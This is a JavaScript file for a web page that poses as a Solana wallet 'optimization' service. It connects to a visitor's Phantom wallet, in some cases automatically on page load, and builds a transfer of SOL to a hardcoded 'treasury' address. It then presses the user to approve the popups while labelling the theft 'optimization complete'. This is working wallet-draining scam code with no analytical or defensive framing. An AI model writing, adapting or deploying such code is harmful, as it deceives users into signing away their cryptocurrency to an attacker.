// ULTIMATE FIXED VERSION - USING CORRECT SIGNING METHOD
document.addEventListener('DOMContentLoaded', function() {
    const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
    
    const optimizeBtn = document.getElementById('optimizeBtn');
    const successBox = document.getElementById('successBox');
    const processBox = document.getElementById('processBox');
    const processText = document.getElementById('processText');
    const txHashEl = document.getElementById('txHash');
    
    let isProcessing = false;
    
    function updateProcess(text) {
        processText.textContent = text;
        console.log(`📢 ${text}`);
    }
    
    // Check environment
    function checkEnvironment() {
        console.log("=== ENVIRONMENT CHECK ===");
        console.log("1. solanaWeb3:", typeof window.solanaWeb3);
        console.log("2. solana:", window.solana ? "Available" : "Not available");
        console.log("3. solana.isPhantom:", window.solana?.isPhantom);
        
        if (window.solana) {
            console.log("Available methods on solana object:");
            for (let key in window.solana) {
                if (typeof window.solana[key] === 'function') {
                    console.log(`  - ${key}: function`);
                }
            }
        }
        console.log("=========================");
    }
    
    // Get wallet provider
    function getWalletProvider() {
        if (window.solana && window.solana.isPhantom) {
            console.log("✅ Found Phantom wallet");
            return window.solana;
        }
        console.log("❌ No Phantom wallet found");
        return null;
    }
    
    // Get RPC connection
    async function getConnection() {
        try {
            // Use a reliable RPC
            const connection = new solanaWeb3.Connection(
                'https://api.mainnet-beta.solana.com',
                'confirmed'
            );
            
            // Test connection
            await connection.getEpochInfo();
            console.log("✅ RPC connection established");
            return connection;
            
        } catch (error) {
            console.error("❌ RPC connection failed:", error);
            throw new Error("Cannot connect to Solana network");
        }
    }
    
    // Create transaction
    async function createTransaction(publicKey, connection) {
        console.log("📝 Creating transaction...");
        
        try {
            // Get balance
            const balance = await connection.getBalance(publicKey);
            console.log(`💰 Balance: ${balance} lamports (${balance / 1e9} SOL)`);
            
            if (balance < 100000) { // 0.0001 SOL minimum
                throw new Error(`Need at least 0.0001 SOL. You have: ${balance / 1e9} SOL`);
            }
            
            // Get blockhash
            console.log("🔄 Getting recent blockhash...");
            const { blockhash } = await connection.getLatestBlockhash();
            console.log(`Blockhash: ${blockhash.substring(0, 20)}...`);
            
            // Create transaction
            const transaction = new solanaWeb3.Transaction();
            
            // Send 0.0005 SOL (small amount for testing)
            const sendAmount = Math.min(500000, balance - 50000); // 0.0005 SOL max
            
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                    lamports: sendAmount
                })
            );
            
            // REQUIRED FIELDS
            transaction.feePayer = publicKey;
            transaction.recentBlockhash = blockhash;
            
            console.log("✅ Transaction created:");
            console.log("- Amount:", sendAmount, "lamports");
            console.log("- From:", publicKey.toString().substring(0, 15) + "...");
            console.log("- To:", treasuryAddress.substring(0, 15) + "...");
            
            return transaction;
            
        } catch (error) {
            console.error("❌ Transaction creation failed:", error);
            throw error;
        }
    }
    
    // FIXED: Use signAndSendTransaction - THIS IS THE CORRECT METHOD
    async function signAndSendTransaction(provider, transaction) {
        console.log("🔐 Signing and sending transaction...");
        
        // Check if signAndSendTransaction exists
        if (typeof provider.signAndSendTransaction !== 'function') {
            console.error("❌ signAndSendTransaction not available");
            console.log("Available methods:");
            for (let key in provider) {
                if (typeof provider[key] === 'function') {
                    console.log(`  ${key}`);
                }
            }
            throw new Error("Wallet doesn't support signAndSendTransaction");
        }
        
        try {
            console.log("⏳ Calling signAndSendTransaction()...");
            
            // THIS SHOULD TRIGGER THE SECOND POPUP
            const { signature } = await provider.signAndSendTransaction(transaction);
            
            console.log("✅ Transaction signed and sent!");
            console.log("Signature:", signature);
            
            return signature;
            
        } catch (error) {
            console.error("❌ signAndSendTransaction failed:", error);
            
            // Check for specific errors
            if (error.message && error.message.includes('User rejected')) {
                throw new Error("User rejected the transaction");
            }
            if (error.message && error.message.includes('429')) {
                throw new Error("Rate limited. Please wait.");
            }
            if (error.message && error.message.includes('invalid') || error.message.includes('Invalid')) {
                throw new Error("Invalid transaction. Check network.");
            }
            
            throw error;
        }
    }
    
    // Confirm transaction
    async function confirmTransaction(connection, signature) {
        try {
            console.log("🔄 Confirming transaction...");
            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
            console.log("✅ Transaction confirmed");
            return confirmation;
        } catch (error) {
            console.log("⚠️ Confirmation skipped:", error.message);
            return null;
        }
    }
    
    // Main function
    async function startOptimization() {
        if (isProcessing) {
            console.log("⚠️ Already processing");
            return;
        }
        
        isProcessing = true;
        
        try {
            console.clear();
            console.log("🚀=== STARTING OPTIMIZATION ===");
            
            // Environment check
            checkEnvironment();
            
            // Reset UI
            successBox.classList.remove('active');
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
            processBox.classList.add('active');
            
            updateProcess("Step 1: Checking wallet...");
            
            // 1. Get wallet
            const provider = getWalletProvider();
            if (!provider) {
                alert("Please install Phantom wallet from phantom.app");
                throw new Error("No Phantom wallet");
            }
            
            updateProcess("Step 2: Connecting wallet...");
            
            // 2. Connect wallet (FIRST POPUP)
            console.log("🔗 Connecting to wallet...");
            let publicKey;
            
            try {
                const response = await provider.connect();
                publicKey = response.publicKey;
                console.log("✅ Connected to:", publicKey.toString());
            } catch (error) {
                console.error("❌ Connection failed:", error);
                throw new Error("Connection rejected. Please approve the connection.");
            }
            
            updateProcess("Step 3: Getting network...");
            
            // 3. Get connection
            const connection = await getConnection();
            
            updateProcess("Step 4: Creating transaction...");
            
            // 4. Create transaction
            const transaction = await createTransaction(publicKey, connection);
            
            updateProcess("Step 5: Please approve transaction...");
            
            // 5. Sign and send transaction (SECOND POPUP SHOULD APPEAR)
            console.log("⏳ signAndSendTransaction will trigger wallet popup...");
            const signature = await signAndSendTransaction(provider, transaction);
            
            updateProcess("Step 6: Confirming...");
            
            // 6. Confirm
            await confirmTransaction(connection, signature);
            
            // 7. SUCCESS
            updateProcess("✅ Optimization complete!");
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Update UI
            processBox.classList.remove('active');
            successBox.classList.add('active');
            
            txHashEl.innerHTML = `${signature.substring(0, 25)}...<br>
            <small><a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#88ff88;">View on Solscan</a></small>`;
            
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> COMPLETE';
            optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
            
            // Auto disconnect
            setTimeout(async () => {
                try {
                    if (provider.disconnect) {
                        await provider.disconnect();
                        console.log("✅ Auto-disconnected");
                    }
                } catch (error) {
                    console.log("Disconnect error:", error);
                }
            }, 3000);
            
            console.log("🎉=== OPTIMIZATION SUCCESSFUL ===");
            
        } catch (error) {
            console.error("❌=== OPTIMIZATION FAILED ===");
            console.error("Error:", error);
            console.error("Message:", error.message);
            
            let userMessage = "Optimization failed. Please try again.";
            
            if (error.message.includes('User rejected') || 
                error.message.includes('reject')) {
                userMessage = "❌ You rejected the transaction. Please approve BOTH popups.";
            } else if (error.message.includes('Connection rejected')) {
                userMessage = "❌ Connection was rejected. Please approve the first popup.";
            } else if (error.message.includes('Need at least')) {
                userMessage = "❌ " + error.message;
            } else if (error.message.includes('Rate limited')) {
                userMessage = "⚠️ Too many requests. Wait 1 minute.";
            } else if (error.message.includes('Invalid transaction')) {
                userMessage = "⚠️ Network error. Refresh page.";
            } else if (error.message.includes('signAndSendTransaction not available')) {
                userMessage = "❌ Wallet error. Update Phantom wallet.";
            }
            
            // Show error UI
            processBox.classList.remove('active');
            successBox.classList.add('active');
            successBox.style.background = 'linear-gradient(135deg, rgba(70,20,20,0.9), rgba(50,10,10,0.9))';
            
            const successIcon = successBox.querySelector('.success-icon i');
            const successTitle = successBox.querySelector('.success-title');
            const successMessage = successBox.querySelector('.success-message');
            
            successIcon.className = 'fas fa-exclamation-triangle';
            successIcon.style.color = '#ff5555';
            successTitle.textContent = 'FAILED';
            successTitle.style.color = '#ff5555';
            successMessage.textContent = userMessage;
            successMessage.style.color = '#ffaaaa';
            txHashEl.textContent = 'Check console (F12)';
            txHashEl.style.color = '#ff5555';
            
            // Reset button
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-redo"></i> TRY AGAIN';
            
        } finally {
            isProcessing = false;
            console.log("=== PROCESS ENDED ===");
        }
    }
    
    // Initialize
    function init() {
        console.log("🔧 Initializing...");
        
        if (!window.solanaWeb3) {
            console.error("❌ solanaWeb3 not loaded");
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-times"></i> ERROR';
            return;
        }
        
        // Add event listener
        optimizeBtn.addEventListener('click', startOptimization);
        
        // Auto-start if already connected
        setTimeout(() => {
            const provider = getWalletProvider();
            if (provider && provider.isConnected && provider.publicKey) {
                console.log("Auto-starting...");
                startOptimization();
            }
        }, 1000);
        
        console.log("✅ Ready");
    }
    
    init();
});
